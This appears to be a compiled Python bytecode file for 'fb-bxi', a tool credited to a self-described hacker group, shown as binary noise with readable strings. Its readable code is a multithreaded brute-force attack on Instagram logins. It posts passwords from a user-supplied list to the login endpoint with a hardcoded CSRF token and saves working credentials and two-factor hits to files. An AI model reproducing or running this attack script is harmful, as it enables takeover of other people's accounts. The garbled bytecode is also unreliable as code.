a
    �a`  �                   @   s�   d dl mZ d dl mZ d dlZd dlZd dlZd dlZd dlZd dlZd dlm	Z	 d dl
mZ eej�Zd dlZd dlmZ ed� G dd	� d	e�Ze�  dS )
�    )�absolute_import)�print_functionN)�randint)�input)�datetimeu�  


                ▃▅▆█  fb-bxi  █▆▅▃
        --------------------------------
        |Author Name : __spidey-fb__    |
                                        |
        |Youtube : super hackers        |
                                        |
        |Telegram : t.me//binyamin_binni|
                                        |
        |instagram : __legend 0.01      |
             _____________________
       (  INSPIRED BY : binyamin binni  )
        --------------------------------
c                   @   s$   e Zd Zdd� Zdd� Zdd� ZdS )�
InstaBrutec           
      C   s�   zt d�}t d�}td� W n   td� t��  Y n0 t|d��}|�� �� }W d   � n1 sf0    Y  g }d| _|D ]B}|�d�d }t	j
| j||fd�}|��  |�|� t�d	� q~|D ]}	|	��  q�d S )
Nzusername(id)/number > z passList(which u created now) > �
----------------------------z	  exited �rr   �:)�target�argsg�������?)r   �print�sys�exit�open�read�
splitlinesZCoutprox�split�	threadingZThread�New_Br�start�append�time�sleep�join)
�self�userZCombo�xZ	Combolist�threadZcomboZpassword�t�j� r!   �	fb-bxi.py�__init__    s&    *
zInstaBrute.__init__c                 C   s$   d}d}t �||gt jdk � d S )N�clear�cls�nt)�os�system�name)r   ZlinuxZwindowsr!   r!   r"   r%   8   s    zInstaBrute.clsc           
   	   C   sd  d}d}t t�� �� �}|d|� d|� �i dd�}t�� ��}|�|�}|j||dddd	d
�d�}t|� d|� d�� d|j	v r�td| d | d � t
dd��&}	|	�|d | d � W d   � n1 s�0    Y  nfd|j	v �r@td| d | d � t
dd��&}	|	�|d | d � W d   � n1 �s60    Y  W d   � n1 �sV0    Y  d S )Nz)https://www.instagram.com/accounts/login/z.https://www.instagram.com/accounts/login/ajax/z#PWD_INSTAGRAM_BROWSER:0:r
   Zfalse)ZusernameZenc_passwordZqueryParamsZoptIntoOneTapzrMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36ZXMLHttpRequestZ ZxKmz4hXp6XKmTPg9lzgYxXN4sFr2pzo)z
User-AgentzX-Requested-WithZRefererzx-csrftoken)�dataZheadersr   Zcheckpoint_url� z --> Good hack zgood.txt�a�
Ztwo_factor_requiredz  -->  Good It has to be checked zresults_NeedVerfiy.txt)�intr   ZnowZ	timestamp�requestsZSession�getZpostr   �textr   �write)
r   r   �pwdZlinkZ	login_urlr   Zpayload�sr	   r   r!   r!   r"   r   =   s2    �
�

6zInstaBrute.New_BrN)�__name__�
__module__�__qualname__r#   r%   r   r!   r!   r!   r"   r      s   r   )Z
__future__r   r   r/   r   r   r   r'   Zrandomr   Z	six.movesr   �str�versionZCheckVersion�rer   r   �objectr   r!   r!   r!   r"   �<module>   s   0
@